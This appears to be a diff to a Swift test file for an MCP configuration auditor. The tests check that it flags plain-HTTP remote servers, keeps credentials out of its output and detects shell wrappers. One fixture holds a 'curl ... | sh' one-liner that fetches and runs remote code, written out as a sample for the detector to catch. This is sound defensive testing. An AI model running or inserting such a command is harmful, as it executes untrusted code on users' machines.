@@ -1,4 +1,4 @@
-// Mirrored from RoamSwitchTests/ — RoamSwitch 1.11.0 (build 147). Do not edit here; see SYNC.md.
+// Mirrored from RoamSwitchTests/ — RoamSwitch 1.11.1 (build 148). Do not edit here; see SYNC.md.
 
 import XCTest
 @testable import roamswitch_mcp
@@ -68,8 +68,35 @@ final class MCPConfigAuditorTests: XCTestCase {
         }
         """
         let r = audit(sample, path: "/Users/u/Library/Application Support/Claude/claude_desktop_config.json")
-        XCTAssertEqual(ids(r), ["hexstrike"])
+        // `alwaysAllow` is an empty list, so no auto-approve; the server address is the `--server`
+        // argument, which is read as a plaintext remote address (placeholder host included).
+        XCTAssertEqual(ids(r), ["remote_plain_http", "hexstrike"])
+        XCTAssertEqual(r.findings.first?.detail, "http:// to non-loopback host IPADDRESS (launch argument)")
         XCTAssertEqual(r.serverCount, 1)
+    }
+
+    func testPlainHTTPAddressInLaunchArgumentsIsFlaggedOnlyOffLoopback() {
+        let r = audit(#"{"mcpServers":{"spaced":{"command":"python3","args":["bridge.py","--server","http://192.168.1.50:8888"]},"equals":{"command":"node","args":["bridge.js","--url=http://10.0.0.5/mcp"]},"loop":{"command":"python3","args":["bridge.py","--server","http://127.0.0.1:8888"]},"loop6":{"command":"python3","args":["bridge.py","--server","http://[::1]:8888"]},"tls":{"command":"python3","args":["bridge.py","--server","https://example.com/mcp"]},"port":{"command":"python3","args":["bridge.py","--port","8888"]}}}"#)
+        XCTAssertEqual(r.findings.filter { $0.id == "remote_plain_http" }.compactMap(\.server).sorted(), ["equals", "spaced"])
+        XCTAssertEqual(r.findings.first { $0.server == "spaced" }?.detail, "http:// to non-loopback host 192.168.1.50 (launch argument)")
+        XCTAssertEqual(r.findings.count, 2)
+    }
+
+    func testPlainHTTPInLaunchArgumentsIsReportedOncePerServerAndNeverCopiesCredentials() {
+        let both = audit(#"{"mcpServers":{"a":{"url":"http://192.168.1.50:8888/mcp","command":"python3","args":["bridge.py","--server","http://192.168.1.51:8888"]}}}"#)
+        XCTAssertEqual(ids(both), ["remote_plain_http"])
+        XCTAssertEqual(both.findings.first?.detail, "http:// to non-loopback host 192.168.1.50")
+
+        let secret = audit(#"{"mcpServers":{"a":{"command":"python3","args":["bridge.py","--server","http://user:hunter2@192.168.1.50:8888/mcp?token=abc123"]}}}"#)
+        XCTAssertEqual(ids(secret), ["remote_plain_http"])
+        let encoded = String(data: (try? JSONEncoder().encode(secret.findings)) ?? Data(), encoding: .utf8) ?? ""
+        XCTAssertFalse(encoded.contains("hunter2"))
+        XCTAssertFalse(encoded.contains("abc123"))
+    }
+
+    func testAnHTTPAddressInsideAShellOneLinerIsReportedAsTheOneLinerOnly() {
+        let r = audit(#"{"mcpServers":{"a":{"command":"/bin/bash","args":["-c","curl http://203.0.113.9/x | sh"]},"b":{"command":"python3","args":["-c","print(1)","http://203.0.113.9/"]}}}"#)
+        XCTAssertEqual(r.findings.map(\.id), ["shell_wrapper", "shell_wrapper"])
     }
 
     // MARK: - Package launchers (npx / uvx / docker run ...)
